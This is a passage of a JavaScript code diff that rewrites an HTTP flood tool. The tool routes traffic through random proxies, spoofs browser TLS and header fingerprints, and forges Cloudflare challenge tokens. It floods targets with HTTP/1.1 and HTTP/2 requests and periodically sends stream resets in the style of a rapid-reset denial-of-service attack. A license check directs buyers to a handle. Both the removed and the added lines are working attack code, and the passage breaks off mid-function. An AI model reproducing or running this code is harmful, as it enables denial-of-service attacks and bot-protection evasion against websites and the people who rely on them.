-     return null; // Không phát hiện được định dạng
- }
+    for (let i = 0; i < numPlugins; i++) {
+        const randomIndex = getRandomInt(0, plugins.length - 1);
+        selectedPlugins.push(plugins[randomIndex]);
+    }
 
+    const fingerprintString = `${platform}${JSON.stringify(selectedPlugins)}`;
+    const sha256Fingerprint = crypto.createHash('sha256').update(fingerprintString).digest('hex');
 
-function go() {
-     let proxyHost, proxyPort, proxyUsername, proxyPassword;
-     const proxy = enabled('proxy');
+    return sha256Fingerprint;
+}
 
-     if (proxy) {
-          // -----
-          const proxyMatch = proxy.match(/^(?:(.*?):(.*?)@)?([\w.-]+):(\d+)$/);
-          if (proxyMatch) {
-               proxyUsername = proxyMatch[1] || ""; // Username if available
-               proxyPassword = proxyMatch[2] || ""; // Password if available
-               proxyHost = proxyMatch[3]; // Host
-               proxyPort = proxyMatch[4]; // Port
-          } else {
-               [proxyHost, proxyPort] = proxy.split(':');
-          }
+function checkLicense(license) {
+    const licenseURL = new URL(fwtgws);
+    const request = https.request(licenseURL);
+    request.setTimeout(15 * 1000);
+    request.on('response', response => {
+        var data = '';
+        response.on('data', chunk => data += chunk);
+        response.on('end', function () {
+            if (data.trim() === license) {
+            } else {
+                process.exit(1);
+            }
+        });
+    });
+    request.on('timeout', function () {
+        console.log('[#8] Whoops something went wrong pm @rapidreset');
+        process.exit(1);
+    });
+    request.on('error', error => {
+        console.log('[#9] Whoops something went wrong pm @rapidreset');
+        process.exit(1);
+    });
+    request.end();
+}
 
-     } else {
-          [proxyHost, proxyPort, proxyUsername, proxyPassword] = proxies[~~(Math.random() * proxies.length)].split(':');
-     }
+const generatedFP = generateSpoofedFingerprint()
 
-     // console.log(proxyHost, proxyPort, proxyUsername, proxyName);
-     if (Number(proxyPort) === NaN) {
-          return
-     }
+//sykaconst pizdecf = getRandomInt(150,350)
 
+function buildRequest() {
+    const browserVersion = getRandomInt(126, 129);
+    var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+    const fwfw = ['Google Chrome', 'Brave'];
+    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
 
+    let brandValue;
+    if (browserVersion === 126) {
+        brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
+    }
+    else if (browserVersion === 127) {
+        brandValue = `\"Not)A;Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
+    }
+    else if (browserVersion === 128) {
+        brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
+    }
+    else if (browserVersion === 129) {
+        brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
+    }
 
-     let SocketTLS;
-     const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
-          // Base64 encode username and password for Proxy-Authorization
-          let proxyAuthHeader = "";
-          if (proxyUsername && proxyPassword) {
-               const credentials = Buffer.from(`${proxyUsername}:${proxyPassword}`).toString("base64");
-               proxyAuthHeader = `Proxy-Authorization: Basic ${credentials}\r\n`;
-          }
+    if (customuavalue) {
+        userAgent = customuavalue;
+    } else {
+        userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+    }
 
+    const isBrave = wfwf === 'Brave';
 
-          netSocket.once('data', () => {
-               let browser = generate_headers();
-               let url = target_url
-               let headers = http1_headers(url);
+    const acceptHeaderValue = isBrave
+        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
+        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
 
-               if (user_agent && cookies) {
-                    if (headers && typeof headers !== 'boolean') {
-                         try {
-                              browser.headers = JSON.parse(headers);
-                         } catch (err) {
-                              console.log("headers error:", err);
-                         }
-                    } else {
-                         const parsed = parse_headers(user_agent);
-                         browser.headers = versions["chrome"][parsed.version].headers;
+    const langValue = isBrave
+        ? 'en-US,en;q=0.9'
+        : 'en-US,en;q=0.7';
+
+    const secChUa = `${brandValue}`;
+    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
+
+    let mysor = '\r\n';
+    let mysor1 = '\r\n';
+    if (hcookie || currentRefererValue) {
+        mysor = '\r\n'
+        mysor1 = '';
+    } else {
+        mysor = '';
+        mysor1 = '\r\n';
+    }
+
+    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
+        `Host: ${url.hostname}\r\n` +
+        'Connection: keep-alive\r\n' +
+        'Cache-Control: max-age=0\r\n' +
+        `sec-ch-ua: ${secChUa}\r\n` +
+        'sec-ch-ua-mobile: ?0\r\n' +
+        'sec-ch-ua-platform: "Windows"\r\n' +
+        'Upgrade-Insecure-Requests: 1\r\n' +
+        `User-Agent: ${userAgent}\r\n` +
+        `Accept: ${acceptHeaderValue}\r\n` +
+        'Sec-Fetch-Site: none\r\n' +
+        'Sec-Fetch-Mode: navigate\r\n' +
+        'Sec-Fetch-User: ?1\r\n' +
+        'Sec-Fetch-Dest: document\r\n' +
+        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
+        `Accept-Language: ${langValue}\r\n` + mysor1;
+
+    if (hcookie) {
+        headers += `Cookie: ${hcookie}\r\n`;
+    }
+
+    if (currentRefererValue) {
+        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
+    }
+
+    const mmm = Buffer.from(`${headers}`, 'binary');
+    //console.log(headers.toString());
+    return mmm;
+}
+
+const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
+
+async function go() {
+    let proxyHost, proxyPort, username, password;
+
+    if (customIP) {
+        [proxyHost, proxyPort] = customIP.split(':');
+    } else {
+        [proxyHost, proxyPort, username, password] = proxy[~~(Math.random() * proxy.length)].split(':');
+    } let tlsSocket;
+
+    if (!proxyPort || isNaN(proxyPort)) {
+        await go();
+        return;
+    }
+
+    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
+        netSocket.once('data', async () => {
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.hostname,
+                ciphers: [
+                    'TLS_GREASE (0xDADA)',
+                    'TLS_AES_128_GCM_SHA256',
+                    'TLS_AES_256_GCM_SHA384',
+                    'TLS_CHACHA20_POLY1305_SHA256',
+                    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
+                    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
+                    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
+                    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
+                    'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
+                    'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
+                    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
+                    'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
+                    'TLS_RSA_WITH_AES_128_GCM_SHA256',
+                    'TLS_RSA_WITH_AES_256_GCM_SHA384',
+                    'TLS_RSA_WITH_AES_128_CBC_SHA',
+                    'TLS_RSA_WITH_AES_256_CBC_SHA'
+                ].join(':'),
+                sigalgs: [
+                    'ecdsa_secp256r1_sha256',
+                    'rsa_pss_rsae_sha256',
+                    'rsa_pkcs1_sha256',
+                    'ecdsa_secp384r1_sha384',
+                    'rsa_pss_rsae_sha384',
+                    'rsa_pkcs1_sha384',
+                    'rsa_pss_rsae_sha512',
+                    'rsa_pkcs1_sha512'
+                ].join(':'),
+                ecdhCurve: 'X25519:P-256:P-384',
+                secureoptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
+                secure: true,
+                minVersion: 'TLSv1.3', // Устанавливаем минимальную версию TLS 1.3
+                maxVersion: 'TLSv1.3', // Ограничиваем использование только TLS 1.3
+                session: crypto.randomBytes(64),
+                compression: true,
+                rejectUnauthorized: true, // Включаем проверку сертификатов
+                honorCipherOrder: false, // Следуем установленному порядку шифров
+                requestOCSP: true, // Включаем проверку отзыва сертификатов через OCSP
+            }, () => {
+                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
+
+                    if (forceHttp == 2) {
+                        tlsSocket.end(() => tlsSocket.destroy());
+                        return;
                     }
-                    const chromium = parse_headers(user_agent)
-                    browser.headers['user-agent'] = user_agent;
-                    browser.headers['sec-ch-ua'] = `\"Google Chrome\";v=\"${chromium.version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${chromium.version}\"`
-                    browser.headers['sec-ch-platform'] = `\"${chromium.os}\"`
-                    browser.headers['cookie'] = cookies;
-               }
 
-               SocketTLS = tls.connect({
-                    socket: netSocket,
-                    ALPNProtocols: http_v == 2 ? ['h2', 'http/1.1'] : http_v == 1 ? ['http/1.1'] : ['h2', 'http/1.1'],
-                    host: url.hostname,
-                    servername: url.host,
-                    ciphers: browser.ciphers,
-                    minVersion: Math.random() < 0.5 ? 'TLSv1.3' : 'TLSv1.2',
-                    maxVersion: 'TLSv1.3',
-                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
-                    rejectUnauthorized: false
-               }, () => {
-                    SocketTLS.allowHalfOpen = true;
-                    SocketTLS.setNoDelay(true);
-                    SocketTLS.setKeepAlive(true, 60000);
-                    SocketTLS.setMaxListeners(0);
-                    if (!SocketTLS.alpnProtocol || SocketTLS.alpnProtocol == 'http/1.1' && http_v === 1) {
-                         if (http_v == 2 || !http_v) {
-                              SocketTLS.end(() => SocketTLS.destroy())
-                              return
-                         }
-                         function http1() {
-                              SocketTLS.write(headers, (err) => {
-                                   if (!err) {
-                                        setTimeout(() => {
-                                             http1()
-                                        }, !sleep ? 0 : 1000 / ratelimit)
-                                   } else {
-                                        SocketTLS.end(() => SocketTLS.destroy());
-                                   }
-                              })
-                         }
-
-                         http1()
-
-                         SocketTLS.on('error', (err) => {
-                              SocketTLS.end(() => SocketTLS.destroy())
-                         })
-
-                         SocketTLS.on('data', (data) => {
-                              const status = decode(data.toString('utf-8'));
-                              if (!isNaN(status)) {
-                                   if (!statuses[status])
-                                        statuses[status] = 0
-
-                                   statuses[status]++
-                              }
-                              if (status === '301' || status === '302') {
-                                   url = new URL(data.toString('utf-8').toLowerCase().split('\r\n').find(line => line.startsWith('location: ')).replace('location: ', ''), url.href);
-                                   console.log(url)
-                              }
-                              const response_cookies = data.toString('utf-8').toLowerCase().split('\r\n').find(line => line.startsWith('set-cookie: '))
-                              if (response_cookies !== undefined) {
-                                   if (browser.headers['cookie'] === null && !cookies) browser.headers['cookie'] = response_cookies.replace('set-cookie: ', '');
-                                   else if (browser.headers['cookie'] === null && cookies) browser.headers['cookie'] = cookies + "; " + response_cookies.replace('set-cookie: ', '')
-                              }
-                         })
-
-                         return;
+                    function doWrite() {
+                        tlsSocket.write(http1Payload, (err) => {
+                            if (!err) {
+                                setTimeout(() => {
+                                    doWrite();
+                                }, 1000 / ratelimit);
+                            } else {
+                                tlsSocket.end(() => tlsSocket.destroy());
+                            }
+                        });
                     }
 
-                    let streamId = 1
-                    let data = Buffer.alloc(0)
-                    let hpack = new HPACK()
-                    hpack.setTableSize(4096)
+                    doWrite();
 
-                    const updateWindow = Buffer.alloc(4);
-                    updateWindow.writeUInt32BE(15663105, 0);
+                    tlsSocket.on('error', () => {
+                        tlsSocket.end(() => tlsSocket.destroy());
+                    });
+                    return;
+                }
 
-                    const frames = [
-                         Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'),
-                         encodeFrame(0, 4, encodeSettings([
-                              [1, Math.random() < 0.5 ? 65536 : 65535],       //headerTableSize
-                              [2, 0],                                         //enablePush
-                              [3, Math.random() < 0.5 ? 100 : 1000],          //maxConcurrentStreams
-                              [4, Math.random() < 0.5 ? 6291456 : 33554432],  //initialWindowSize
-                              [5, 16384],                                     //maxFrameSize
-                              [6, 262144]                                     //maxHeaderListSize
-                         ])),
-                         encodeFrame(0, 8, updateWindow)
-                    ];
+                if (forceHttp == 1) {
+                    tlsSocket.end(() => tlsSocket.destroy());
+                    return;
+                }
 
-                    SocketTLS.on('data', (eventData) => {
-                         data = Buffer.concat([data, eventData])
-                         while (data.length >= 9) {
-                              const frame = decodeFrame(data)
-                              if (frame) {
-                                   data = data.subarray(frame.length + 9)
-                                   if (frame.type == 4 && frame.flags == 0) {
-                                        // SETTINGS frame
-                                        //                                      console.log("Got settings frame: "+frame.payload)
-                                        SocketTLS.write(encodeFrame(0, 4, "", 1))
-                                   }
+                let streamId = 1;
+                let data = Buffer.alloc(0);
+                let hpack = new HPACK();
+                hpack.setTableSize(4096);
 
-                                   if (frame.type == 0) {
-                                        // DATA frame
-                                        let window_size = frame.length;
-                                        if (window_size < 6000) {
-                                             let inc_win = 65536 - window_size;
-                                             window_size += inc_win;
-                                             // console.log("window size:", window_size);
-                                             const update_win = Buffer.alloc(4);
-                                             update_win.writeUInt32BE(inc_win, 0);
-                                             SocketTLS.write(encodeFrame(0, 8, update_win));
+                const updateWindow = Buffer.alloc(4);
+                updateWindow.writeUInt32BE(15663105, 0);
+
+                const frames = [
+                    Buffer.from(PREFACE, 'binary'),
+                    encodeFrame(0, 4, encodeSettings([
+                        [1, 65536],
+                        [2, 0],
+                        [4, 6291456],
+                        [6, 262144]
+                    ])),
+                    encodeFrame(0, 8, updateWindow)
+                ];
+
+                tlsSocket.on("close", () => {
+                    if (!statuses["CLOSE"]) statuses["CLOSE"] = 0;
+                    statuses["CLOSE"]++;
+                });
+
+                tlsSocket.on('data', (eventData) => {
+                    data = Buffer.concat([data, eventData]);
+//    const responseString = data.toString(); /// debug34
+//                 console.log('Received Data:\n', responseString);
+                    while (data.length >= 9) {
+                        const frame = decodeFrame(data);
+                        if (frame != null) {
+                            data = data.subarray(frame.length + 9);
+                            if (frame.type == 4 && frame.flags == 0) {
+                                tlsSocket.write(encodeFrame(0, 4, "", 1));
+                            }
+
+                            if (frame.type == 1) {
+                                const decodedHeaders = hpack.decode(frame.payload);
+                                const setCookieHeaders = decodedHeaders.filter(header => header[0].toLowerCase() === 'set-cookie');
+                                const cacheControlHeader = decodedHeaders.find(header => header[0].toLowerCase() === 'cache-control');
+                                const statusObject = decodedHeaders.find(header => header[0] === ':status');
+                                const status = statusObject ? statusObject[1] : null;
+
+                                if (parsedCookies) {
+                                    if (setCookieHeaders && setCookieHeaders.length > 0) {
+                                        let formattedCookies = setCookieHeaders
+                                            .map(cookie => cookie[1].split(';')[0].trim())
+                                            .join(';');
+                                        cookiesToInclude = formattedCookies;
+                                    }
+                                }
+
+                                if (shouldCloseSession) {
+                                    if (cacheControlHeader && cacheControlHeader[1].toLowerCase().includes('max-age=15')) {
+                                        tlsSocket.end(() => tlsSocket.destroy());
+                                        return;
+                                    }
+
+                                    if (pizdecnaxyi) {
+                                        if (status) {
+                                            if (['403', '400', '429', '408', '401'].includes(status)) {
+                                                tlsSocket.end(() => tlsSocket.destroy());
+                                                return;
+                                            }
                                         }
-                                   }
+                                    }
+                                }
 
-                                   if (frame.type == 1) {
-                                        // HEADERS frame
-                                        try {
-                                             const status = parseInt(hpack.decode(frame.payload).find(x => x[0] == ':status')[1]);
-                                             if (!isNaN(status) && status >= 100 && status <= 599) {
-                                                  // console.log("status:", status);
-                                                  if (!statuses[status])
-                                                       statuses[status] = 0
+                                if (frame.type == 6) {
+                                    if (!(frame.flags & 0x1)) {
+                                        tlsSocket.write(encodeFrame(0, 6, frame.payload, 0x1));
+                                    }
+                                }
 
-                                                  statuses[status]++
+                                if (!statuses[status]) {
+                                    statuses[status] = 0;
+                                }
 
-                                                  if (status === 302 || status === 301) {
-                                                       const redirect = hpack.decode(frame.payload).find(x => x[0] == 'location')[1];
-                                                       url = new URL(redirect, url.href);
-                                                  }
+                                statuses[status]++;
+                            }
 
-                                                  if (status === 429) {
-
-                                                  }
-
-                                                  try {
-                                                       const response_cookies = hpack.decode(frame.payload).find(x => x[0] == 'set-cookie')[1];
-                                                       if (response_cookies) {
-                                                            if (browser.headers['cookie'] === null && !cookies) browser.headers['cookie'] = response_cookies
-                                                            else if (browser.headers['cookie'] === null && cookies) browser.headers['cookie'] = cookies + "; " + response_cookies
-                                                       }
-                                                  } catch (_) {
-
-                                                  }
-                                             }
-                                        } catch (_err) {
-                                             // console.log(err);
-                                             // const headers = hpack.decode(frame.payload);
-                                             // if (headers.includes('status')) {
-                                             //     console.log(headers);
-                                             // }
-                                             // console.log(headers);
-
+                            if (frame.type == 7 || frame.type == 5) {
+                                if (frame.type == 7) {
+                                    if (debugMode) {
+                                        if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
+                                        statuses["GOAWAY"]++;
+                                        if (reset) {
+                                            tlsSocket.write(encodeRstStream(0, 3, 0));
+                                            tlsSocket.end();
                                         }
-                                   }
-                                   if (frame.type == 6) {
-                                        if (!(frame.flags & 0x1)) {
-                                             SocketTLS.write(encodeFrame(0, 6, frame.payload, 0x1));
-                                        }
-                                   }
-                                   if (frame.type == 7 || frame.type == 5) {
-                                        if (frame.type == 7) {
-                                             if (!statuses["GOAWAY"])
-                                                  statuses["GOAWAY"] = 0
-
-                                             statuses["GOAWAY"]++
-                                        }
-                                        SocketTLS.end(() => SocketTLS.destroy())
-                                   }
-
-                              } else {
-                                   break
-                              }
-                         }
-                    })
-
-                    SocketTLS.on('error', (err) => {
-                         return;
-                    })
-
-                    SocketTLS.on('close', () => {
-                         return;
-                    })
-
-                    SocketTLS.write(Buffer.concat(frames))
-
-                    function main() {
-                         let requests_sent = 0;
-                         if (SocketTLS.destroyed) {
-                              return
-                         }
-                         for (let i = 0; i < ratelimit; i++) {
-                              const headers = Object.entries({
-                                   ':method': 'GET',
-                                   ':authority': url.hostname,
-                                   ':scheme': 'https',
-                                   ':path': `${knownbotnets ? "/" + [...Array(6)].map(() => Math.random().toString(36).charAt(2)).join('') : url.pathname}${querystring ? `?search=` + [...Array(8)].map(() => Math.random().toString(36).charAt(2)).join('') : ""}`
-                              }).filter(a => a[1] != null);
-
-                              const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
-
-
-                              const metadata = {
-                                   site: ['cross-site', 'same-site', 'same-origin', 'none'],
-                                   mode: ['cors', 'no-cors', 'navigate', 'websocket', 'no-cors'],
-                                   dest: ['document', 'empty', 'iframe', 'image', 'script', 'style']
-                              };
-
-                              if (requests_sent > 1) {
-                                   browser.headers['sec-fetch-site'] = metadata.site[~~Math.floor(Math.random * metadata.site.length)];
-                                   browser.headers['sec-fetch-mode'] = metadata.mode[~~Math.floor(Math.random() * metadata.mode.length)];
-                                   browser.headers['sec-fetch-dest'] = metadata.dest[~~Math.floor(Math.random() * metadata.dest.length)];
-                              }
-
-                              const headers2 = Object.entries({
-                                   'sec-ch-ua': browser.headers['sec-ch-ua'],
-                                   'sec-ch-mobile': browser.headers['sec-ch-mobile'],
-                                   'sec-ch-ua-platform': browser.headers['sec-ch-ua-platform'],
-                                   'upgrade-insecure-requests': browser.headers['upgrade-insecure-requests'],
-                                   'user-agent': browser.headers['user-agent'],
-                                   'accept': browser.headers['accept'],
-                                   'sec-fetch-site': browser.headers['sec-fetch-site'],
-                                   'sec-fetch-mode': browser.headers['sec-fetch-mode'],
-                                   'sec-fetch-user': browser.headers['sec-fetch-user'],
-                                   'sec-fetch-dest': browser.headers['sec-fetch-dest'],
-                                   'accept-encoding': browser.headers['accept-encoding'],
-                                   'accept-language': browser.headers['accept-language'],
-                                   'cookie': browser.headers['cookie'],
-                                   'cache-control': Math.random() > 0.5 ? 'max-age=0' : 'no-cache',
-                                   'priority': `u=${Math.round(Math.random()*5)}, i`
-                                   // 'x-forwarded-for': random_ip()
-                              }).filter(a => a[1] != null);
-
-
-                              const headers3 = Object.entries({
-                                   ...(Math.random() < 0.5 && { [`referer`]: `https://${url.hostname}/${randomString}.${Math.random() > 0.5 ? 'php' : 'js'}` }),
-                                   ...(Math.random() < 0.4 && { [`origin`]: `${url.href}` }),
-                                   ...(Math.random() < 0.9 && { ['purpose']: 'prefetch' }),
-                                   ...(Math.random() < 0.5 && { ['sec-ch-prefers-color-scheme']: Math.round(Math.random()) === 1 ? 'dark' : 'light' }),
-                              }).filter(a => a[1] != null)
-
-                              const combinedHeaders = headers.concat(headers2).concat(headers3);
-
-//                              console.log(streamId, combinedHeaders);
-                              // process.exit(0);
-
-                              const packed = Buffer.concat([
-                                   Buffer.from([0x80, 0, 0, 0, 0xFF]),
-                                   hpack.encode(combinedHeaders)
-                              ]);
-
-                              SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
-                              requests_sent += 1;
-                              // if (requests_sent >= ratelimit) {
-                              //     SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
-                              //     SocketTLS.end(() => SocketTLS.destroy());
-                              // }
-                              // if (headersPerReset <= requests_sent) {
-                              //     SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
-                              //     // headersPerReset = 0;
-                              //     requests_sent = 0;
-                              // }
-//                              if (streamId > 10000) console.log("return"); return
-                              streamId += 2;
-                         }
-                         setTimeout(() => {
-                              main()
-                         }, !sleep ? 0 : 1000 / ratelimit);
+                                    }
+                                }
+                                if (reset) {
+                                    tlsSocket.write(encodeRstStream(0, 3, 0));
+                                    tlsSocket.end(() => tlsSocket.destroy());
+                                }
+                            }
+                        } else {
+                            break;
+                        }
                     }
-                    main()
-               }).on('error', (err) => {
-                    // console.log(err);
-                    SocketTLS.destroy()
-               })
-          })
-          // netSocket.write(`CONNECT ${target_url.host}:443 HTTP/1.1\r\nHost: ${target_url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+                });
 
-          // Send CONNECT request to the proxy
+                tlsSocket.on('close', () => {
+                    tlsSocket.end(() => tlsSocket.destroy());
+                    return;
+                });
 
-          netSocket.write(
-               `CONNECT ${target_url.host}:443 HTTP/1.1\r\n` +
-               `Host: ${target_url.host}:443\r\n` +
-               `${proxyAuthHeader}` +
-               `Proxy-Connection: Keep-Alive\r\n\r\n`
-          );
+                tlsSocket.write(Buffer.concat(frames));
+                // let ratelimit;
+                let currentPathIndex = 0;
+
+                const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+                async function doWrite() {
+                    if (tlsSocket.destroyed) return;
+
+                    const interval = 1000 / ratelimit;
+                    let lastRequestTime = process.hrtime.bigint();
+
+                    const customHeadersArray = [];
+                    if (customHeaders) {
+                        const customHeadersList = customHeaders.split('#');
+                        for (const header of customHeadersList) {
+                            const [name, value] = header.split(':');
+                            if (name && value) {
+                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
+                            }
+                        }
+                    }
+
+                    async function sendRequest() {
+                        const browserVersion = 129;//getRandomInt(129, 129);
+                        let userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+                        const fwfw = ['Google Chrome', 'Brave'];
+                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
+                        const ref = ["same-site", "same-origin", "cross-site"];
+                        const ref1 = ref[Math.floor(Math.random() * ref.length)];
+                        const allah = ["application/x-www-form-urlencoded; charset=UTF-8", "application/x-www-form-urlencoded", "text/html; charset=utf-8", "application/json", "text/plain"];
+                        const allah1 = allah[Math.floor(Math.random() * allah.length)];
+
+                        let brandValue;
+                        if (browserVersion === 126) {
+                            brandValue = `"Not/A)Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+                        } else if (browserVersion === 127) {
+                            brandValue = `"Not)A;Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
+                        } else if (browserVersion === 128) {
+                            brandValue = `"Not;A=Brand";v="24", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+                        } else if (browserVersion === 129) {
+                            brandValue = `"${wfwf}";v="${browserVersion}", "Not=A?Brand";v="8", "Chromium";v="${browserVersion}"`;
+                        }
+
+                        if (customuavalue) {
+                            userAgent = customuavalue;
+                        }
+
+                        const isBrave = wfwf === 'Brave';
+
+                        const acceptHeaderValue = isBrave
+                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
+                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+
+                        const langValue = isBrave
+                            ? 'en-US,en;q=0.9'
+                            : 'en-US,en;q=0.7';
+
+                        const secGpcValue = isBrave ? "1" : undefined;
+
+                        const secChUa = `${brandValue}`;
+                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6) + ".com" : refererValue;
+
+                        const currentPath = paths[currentPathIndex];
+                        currentPathIndex = (currentPathIndex + 1) % paths.length;
+
+                        const headers = Object.entries({
+                            ":method": "GET",
+                            ":authority": url.hostname,
+                            ":scheme": "https",
+                            ":path": query ? handleQuery(query) : (randpath() || currentPath || url.pathname)
+                        }).concat(Object.entries({
+                            "cache-control": Math.random() < 0.48 ? "no-cache" : "max-age=0",
+                            ...(reqmethod === "POST" && { "content-length": "0" }),
+                            ...(reqmethod === "POST" && { "content-type": allah1 }),
+                            "sec-ch-ua": secChUa,
+                            "sec-ch-ua-mobile": "?0",
+                            "sec-ch-ua-platform": `"Windows"`,
+                            "upgrade-insecure-requests": "1",
+                            "user-agent": userAgent,
+                            "accept": reqmethod === "POST" ? "*/*" : acceptHeaderValue,
+                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
+                            "sec-fetch-site": currentRefererValue ? ref1 : "none",
+                            "sec-fetch-mode": "navigate",
+                            "sec-fetch-user": "?1",
+                            "sec-fetch-dest": "document",
+                            "accept-encoding": "gzip, deflate, br, zstd",
+                            "accept-language": langValue,
+                            "priority": "u=0, i",
+                            ...(hcookie && { "cookie": hcookie }),
+                            ...(currentRefererValue && { "referer": currentRefererValue }),
+                            ...(parsedCookies && { "cookie": cookiesToInclude }),
+                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
+                        }).filter(a => a[1] != null));
+
+                        function randpath() {
+                            if (useRandPath) {
+                                return url.pathname + ememmmmmemmeme(5);
+                            }
+                        }
+
+                        function handleQuery(query) {
+                            if (query === '1') {
+                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(43) + '-' + timestampString + '0.0.1.1-' + randstr(4);
+                            } else if (query === '2') {
+                                return url.pathname + '?' + ememmmmmemmeme(5) + '&' + ememmmmmemmeme(5);
+                            } else if (query === '3') {
+                                return url.pathname + '?q=' + ememmmmmemmeme(5) + '&' + ememmmmmemmeme(5);
+                            } else {
+                                return url.pathname;
+                            }
+                        }
+
+                        const packedHeaders = Buffer.concat([
+                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
+                            hpack.encode(headers)
+                        ]);
+
+                        tlsSocket.write(Buffer.concat([encodeFrame(streamId, 1, packedHeaders, 0x1 | 0x4 | 0x20)]));
 
 
-     }).once('error', (err) => {
-          // console.log(err)
-     }).once('close', () => {
-          if (SocketTLS) {
-               SocketTLS.end(() => { SocketTLS.destroy(); go() })
-          }
-     })
+                        if (reset && streamId >= 5 && (streamId - 5) % 10 === 0) {
+                            tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
+                        }
+
+                        streamId += 2;
+                    }
+
+                    async function scheduleNextRequest() {
+                        const now = process.hrtime.bigint();
+                        const elapsedTime = Number(now - lastRequestTime) / 1e6;
+                        lastRequestTime = now;
+
+                        await sendRequest();
+
+                        const nextInterval = interval - elapsedTime;
+
+                        if (nextInterval > 0) {
+                            await delay(nextInterval);
+                        }
+
+                        await scheduleNextRequest();
+                    }
+
+                    scheduleNextRequest();
+                }
+
+                doWrite();
+            }).on('error', () => {
+                tlsSocket.end(() => tlsSocket.destroy());
+            });
+
+        });
+
+        if (!username) {
+            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+        } else {
+            const authString = Buffer.from(`${username}:${password}`).toString('base64');
